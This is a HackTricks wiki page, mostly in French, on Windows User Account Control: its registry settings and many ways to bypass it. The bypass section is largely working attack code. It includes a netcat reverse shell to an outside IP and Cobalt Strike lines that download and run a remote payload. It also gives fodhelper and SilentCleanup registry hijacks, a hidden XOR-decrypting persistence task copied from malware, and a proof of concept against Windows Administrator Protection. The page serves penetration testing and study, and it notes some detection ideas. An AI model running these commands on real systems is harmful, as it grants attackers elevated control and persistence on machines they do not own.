# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **demande de consentement pour les activités nécessitant une élévation**. Les applications possèdent différents niveaux d’`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l’UAC est activé, les applications et les tâches **s’exécutent toujours dans le contexte de sécurité d’un compte non administrateur**, sauf si un administrateur autorise explicitement ces applications/tâches à disposer d’un accès de niveau administrateur au système pour s’exécuter. Il s’agit d’une fonctionnalité pratique qui protège les administrateurs contre les modifications involontaires, mais elle n’est pas considérée comme une boundary de sécurité.<sup>[[2]](#references)</sup>

Pour plus d’informations sur les niveaux d’intégrité :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsqu’un UAC est en place, un utilisateur administrateur reçoit 2 tokens : un token d’utilisateur standard, pour effectuer les actions habituelles avec une intégrité moyenne, et un autre avec les privilèges admin.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail le fonctionnement de l’UAC et inclut le processus de logon, l’expérience utilisateur et l’architecture de l’UAC.<sup>[[2]](#references)</sup> Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de l’UAC en fonction de leur organisation au niveau local (à l’aide de secpol.msc), ou le configurer et le déployer via des Group Policy Objects (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont décrits en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de Group Policy qui peuvent être définis pour l’UAC. Le tableau suivant fournit des informations supplémentaires :

| Paramètre de Group Policy                                                                                                                                                                                                                                                                                                                                                           | Clé de registre                | Paramètre par défaut                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Désactivé)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Demander le consentement pour les binaires non-Windows sur le bureau sécurisé) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Demander les identifiants sur le bureau sécurisé)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Activé ; désactivé par défaut sur Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Désactivé)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Activé)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Activé)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Désactivé)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Activé)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Activé)                                              |

### Stratégies pour installer des logiciels sur Windows

Les **stratégies de sécurité locales** ("secpol.msc" sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non administrateurs d’installer des logiciels**. Cela signifie que même si un utilisateur non administrateur peut télécharger l’installateur de votre logiciel, il ne pourra pas l’exécuter sans un compte administrateur.

### Clés de registre pour forcer l’UAC à demander une élévation

En tant qu’utilisateur standard sans droits admin, vous pouvez vous assurer que le compte "standard" **doit fournir ses identifiants via l’UAC** lorsqu’il tente d’effectuer certaines actions. Cette action nécessiterait la modification de certaines **clés de registre**, pour lesquelles vous devez disposer d’autorisations admin, sauf s’il existe un **UAC bypass**, ou si l’attaquant est déjà connecté en tant qu’administrateur.

Même si l’utilisateur appartient au groupe **Administrators**, ces modifications obligent l’utilisateur à **saisir à nouveau les identifiants de son compte** afin d’effectuer des actions administratives.

**En pratique, cette méthode n’est utile que si vous disposez déjà d’un token élevé, d’un UAC bypass ou d’une mauvaise configuration permettant de modifier ces clés ; sinon, l’écriture dans le registre elle-même est bloquée.**

Les clés et entrées de registre que vous devez modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut également être effectué manuellement via l’outil Local Security Policy. Une fois ces paramètres modifiés, les opérations administratives demandent à l’utilisateur de saisir à nouveau ses identifiants.

### Remarque

**L’User Account Control n’est pas une boundary de sécurité.** Par conséquent, les utilisateurs standard ne peuvent pas sortir de leur compte et obtenir des privilèges administrateur sans exploiter une vulnérabilité d’élévation de privilèges locale.

### Demander un « accès complet à l’ordinateur » à un utilisateur
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode utilise des contrôles d’intégrité pour empêcher les processus de niveau d’intégrité élevé (comme les navigateurs web) d’accéder aux données de niveau d’intégrité faible (comme le dossier des fichiers Internet temporaires). Cela est réalisé en exécutant le navigateur avec un token de faible intégrité. Lorsque le navigateur tente d’accéder aux données stockées dans la zone de faible intégrité, le système d’exploitation vérifie le niveau d’intégrité du processus et autorise l’accès en conséquence. Cette fonctionnalité contribue à empêcher les attaques d’exécution de code à distance d’accéder aux données sensibles du système.
- Lorsqu’un utilisateur ouvre une session Windows, le système crée un token d’accès contenant une liste des privilèges de l’utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d’un utilisateur. Le token contient également une liste des credentials de l’utilisateur, c’est-à-dire les credentials utilisés pour authentifier l’utilisateur auprès de l’ordinateur et des ressources du réseau.

### Autoadminlogon

Pour configurer Windows afin qu’il ouvre automatiquement une session avec un utilisateur spécifique au démarrage, définissez la **`AutoAdminLogon` registry key**. Cela est utile dans les environnements de kiosque ou à des fins de test. Utilisez cette configuration uniquement sur des systèmes sécurisés, car elle expose le mot de passe dans le registre.

Définissez les clés suivantes à l’aide du Registry Editor ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour revenir au comportement de connexion normal, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Notez que si vous disposez d’un accès graphique à la victime, le UAC bypass est simple, car il suffit de cliquer sur « Yes » lorsque l’invite UAC apparaît.

Le UAC bypass est nécessaire dans la situation suivante : **l’UAC est activé, votre processus s’exécute dans un contexte d’intégrité moyenne et votre utilisateur appartient au groupe des administrateurs**.

Il est important de préciser qu’il est **beaucoup plus difficile de bypass l’UAC lorsqu’il est configuré sur le niveau de sécurité le plus élevé (Always) que lorsqu’il est configuré sur l’un des autres niveaux (Default).**

### Triage rapide depuis un shell à intégrité moyenne

Avant de tenter un bypass, confirmez que vous êtes dans le bon scénario et identifiez le build de l’hôte afin de le comparer aux méthodes connues comme fonctionnelles :
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Notes pratiques :
- Si `EnableLUA=0`, vous n’avez pas besoin de bypass : tout token d’administrateur peut directement demander un niveau d’intégrité élevé.
- `ConsentPromptBehaviorAdmin=2` ou `5` est le scénario courant pour les bypass auto-elevate / basés sur COM.
- `Always Notify` augmente le niveau de difficulté, mais vous devez tout de même tester la build exacte au lieu de supposer un échec : UACME suit encore certaines méthodes `AlwaysNotify compatible` sur les builds modernes de Windows.<sup>[[3]](#references)</sup>

### UAC désactivé

Si UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges d’administrateur** (niveau d’intégrité élevé) à l’aide de quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** Basic UAC "bypass" (accès complet au système de fichiers)

Si vous disposez d’un shell avec un utilisateur appartenant au groupe Administrators, vous pouvez **monter le partage C$** via SMB (système de fichiers) localement sur un nouveau disque et vous aurez **accès à tout le contenu du système de fichiers** (même au dossier personnel de l’utilisateur Administrator).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de l’UAC avec Cobalt Strike

Les techniques de Cobalt Strike fonctionneront uniquement si l’UAC n’est pas configuré sur son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** disposent également de plusieurs modules pour **bypass** le **UAC**.

### Interfaces COM élevées (`ICMLuaUtil` / `CMSTPLUA`)

Les objets COM à élévation automatique restent une surface UAC pratique sur les versions modernes. `ICMLuaUtil` est toujours répertorié par UACME comme fonctionnel sur les branches actuelles de Windows, et les outils offensifs continuent d'adapter `CMSTPLUA` en combinant un processus du bureau interactif, une exécution 64 bits et parfois un masquerading du PEB/processus avant d'invoquer le COM Elevation Moniker.<sup>[[3]](#references)</sup>

Conseils pratiques :
- Privilégiez un processus **64-bit** dans la **session interactive** de l'utilisateur (généralement `explorer.exe` ou un de ses processus enfants).
- Si un shell brut échoue, réessayez depuis un BOF / une implémentation UACME plutôt qu'avec un wrapper `CreateProcess` naïf.
- Attendez-vous à ce que l'exécution enfant s'effectue dans un **processus élevé séparé** ; de nombreux BOF n'élèvent pas le beacon actuel directement.

### KRBUACBypass

Documentation et outil sur [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass UAC

[**UACME** ](https://github.com/hfiref0x/UACME)qui est une **compilation** de plusieurs exploits de bypass UAC. Notez que vous devrez **compiler UACME avec Visual Studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`) ; vous devrez savoir **lequel utiliser.**\
Vous devez **être prudent**, car certains bypass **afficheront des invites pour d'autres programmes** qui **alerteront** l'**utilisateur** qu'une action est en cours.<sup>[[3]](#references)</sup>

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**.<sup>[[3]](#references)</sup> Vous pouvez rechercher une technique affectant vos versions :
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
De plus, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, vous obtenez la version Windows `1607` à partir des versions de build.

Une procédure pratique consiste à commencer par **évaluer le build de l’hôte**, puis à lancer la méthode correspondante :
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` compare rapidement le build local avec ses méthodes UAC connues, ce qui permet d’écarter rapidement les PoC obsolètes.<sup>[[4]](#references)</sup>
- `UACME` reste le meilleur catalogue public pour faire correspondre un bypass à un build précis. Les versions récentes ont ajouté de nouvelles méthodes et re-testé les méthodes existantes avec **Windows 11 25H2** ; vérifiez donc à nouveau le README et les notes de version avant de supposer qu’un ancien article de blog s’applique toujours sans modification.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est automatiquement élevé sur les versions modernes de Windows. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y placer une commande permet à un processus d’intégrité moyenne (l’utilisateur appartient au groupe Administrateurs) de lancer un processus d’intégrité élevée sans afficher d’invite UAC.

Chemin de registre interrogé par fodhelper :
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez-le)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes :
- Fonctionne lorsque l’utilisateur actuel est membre du groupe Administrators et que le niveau UAC est défini sur la valeur par défaut/lenient (pas sur Always Notify avec des restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour lancer un PowerShell 64-bit depuis un processus 32-bit sur Windows 64-bit.
- Le Payload peut être n’importe quelle commande (PowerShell, cmd ou chemin vers un EXE). Évitez les interfaces qui demandent une interaction pour plus de furtivité.

#### Variante de détournement CurVer/extension (HKCU uniquement)

Des échantillons récents exploitant `fodhelper.exe` évitent `DelegateExecute` et redirigent plutôt le ProgID `ms-settings` via la valeur `CurVer` par utilisateur. Le binaire auto-elevated résout toujours le handler sous `HKCU`; aucun admin token n’est donc nécessaire pour créer les clés :<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois élevé, le **malware** **désactive généralement les invites futures** en définissant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectue une défense supplémentaire contre les mesures de sécurité (par ex. `Add-MpPreference -ExclusionPath C:\ProgramData`) et recrée la persistence pour s’exécuter avec une intégrité élevée. Une tâche de persistence typique stocke sur le disque un **script PowerShell chiffré avec XOR**, puis le décode et l’exécute en mémoire chaque heure&nbsp;:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante nettoie toujours le dropper et ne laisse que les staged payloads, ce qui fait que la détection repose sur la surveillance du **détournement de `CurVer`**, de la falsification de `ConsentPromptBehaviorAdmin`, de la création d’exclusions Defender ou des tâches planifiées qui déchiffrent PowerShell en mémoire.<sup>[[5]](#references)</sup>

### UAC bypass via la tâche `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` lance `cleanmgr.exe` avec les privilèges les plus élevés et développe `%windir%` depuis l’environnement utilisateur. Si vous contrôlez `HKCU\Environment\windir`, vous pouvez rediriger cette expansion vers une commande arbitraire et obtenir une intégrité élevée sans boîte de dialogue de consentement.<sup>[[8]](#references)</sup> Cette méthode mérite toujours d’être testée sur les versions récentes, car UACME maintient la technique active et le suivi récent des problèmes indique que Windows 11 24H2 pourrait ne nécessiter que de petits ajustements de guillemets.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If the task quotes the path on that build, retry with the payload ending in a quote (for example `cmd.exe"`). Always clean up `HKCU\Environment\windir` after testing.

#### Plus de UAC bypass

Many classic UAC bypasses that abuse UI flows, COM objects, or desktop interaction require a **full interactive session** with the victim; a common `nc.exe` shell or a service running in **Session 0** is often not enough.

You can often solve that using a **meterpreter** session. Migrate to a **process** that has the **Session** value equal to **1**:

![Pointer ms-settings vers une extension personnalisée (.thm) et mapper cette extension vers notre payload - Plus de UAC bypass : Vous pouvez y parvenir avec une session meterpreter. Migrez vers un processus dont la valeur Session...](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass with GUI

If you have access to a **GUI you can just accept the UAC prompt** when it appears; you do not really need a technical bypass. Therefore, obtaining a GUI session is often enough to bypass the practical friction added by UAC.

Moreover, if you get a GUI session that someone was using (potentially via RDP) there are **some tools that will be running as administrator** from where you could **run** a **cmd** for example **as admin** directly without being prompted again by UAC like [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). This might be a bit more **stealthy**.

### Noisy brute-force UAC bypass

If you don't care about being noisy you could always **run something like** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) that **ask to elevate permissions until the user does accepts it**.

### Your own bypass - Basic UAC bypass methodology

If you take a look at **UACME** you will notice that **many UAC bypasses abuse DLL hijacking** (often by making an elevated binary load an attacker-controlled DLL from a writable path). [Read this to learn how to find a DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

The 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is an **auto-elevated** binary that can be abused to load `iscsiexe.dll` by search order. If you can place a malicious `iscsiexe.dll` inside a **user-writable** folder and then modify the current user `PATH` (for example via `HKCU\Environment\Path`) so that folder is searched, Windows may load the attacker DLL inside the elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- This is useful when the current user is in **Administrators** but running at **Medium Integrity** due to UAC.
- The **SysWOW64** copy is the relevant one for this bypass. Treat the **System32** copy as a separate binary and validate behavior independently.
- The primitive is a combination of **auto-elevation** and **DLL search-order hijacking**, so the same ProcMon workflow used for other UAC bypasses is useful to validate the missing DLL load.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Déclencher une alerte sur `reg add` / les écritures dans le registre vers `HKCU\Environment\Path` immédiatement suivies de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur**, tels que `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants inattendus ou des chargements de DLL depuis des répertoires Windows inhabituels.

### Nouvelles recherches à vérifier séparément

Certaines chaînes post-2024 ne ressemblent plus aux détournements classiques du registre `HKCU\Software\Classes`. Par exemple, l’empoisonnement du cache des contextes d’activation peut combiner un **remappage de lecteur** et une **redirection de DLL** afin de passer d’une intégrité moyenne à une intégrité élevée via des interfaces utilisateur approuvées / des binaires à élévation automatique tels que `ctfmon.exe`, puis des cibles plus récentes comme `fodhelper.exe`. Au lieu de reproduire ici le long PoC, consultez les exemples de payload compacts dans :

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Détournement de lettre de lecteur Administrator Protection (25H2) via la mappe de périphériques DOS par session de connexion

Pour connaître toute la surface d’attaque `RAiLaunchAdminProcess` / UIAccess sur Windows 11 25H2, consultez la page dédiée :

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 « Administrator Protection » utilise des tokens shadow-admin avec des mappes `\Sessions\0\DosDevices/<LUID>` propres à chaque session. Le répertoire est créé de manière différée par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant usurpe le token shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **propriétaire** (il hérite de `CREATOR OWNER`), ce qui permet aux liens de lettres de lecteur de prendre la priorité sur `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Étapes :**

1. Depuis une session faiblement privilégiée, appelez `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquez son token principal en un token d’**identification** et usurpez-le tout en ouvrant `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous le contrôle de l’attaquant.
3. Créez-y un lien symbolique `C:` pointant vers un espace de stockage contrôlé par l’attaquant ; les accès ultérieurs au système de fichiers dans cette session résolvent `C:` vers le chemin de l’attaquant, ce qui permet le détournement de DLL/fichiers sans invite.

**PowerShell PoC (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Références

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Fonctionnement de User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Collection de techniques de UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner de compatibilité et launcher de UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adopte l'IA pour générer des backdoors PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Exploitation d'un 0-Day contre des cibles gouvernementales d'Asie du Sud-Est](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Contourner la protection des administrateurs Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC via la tâche SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
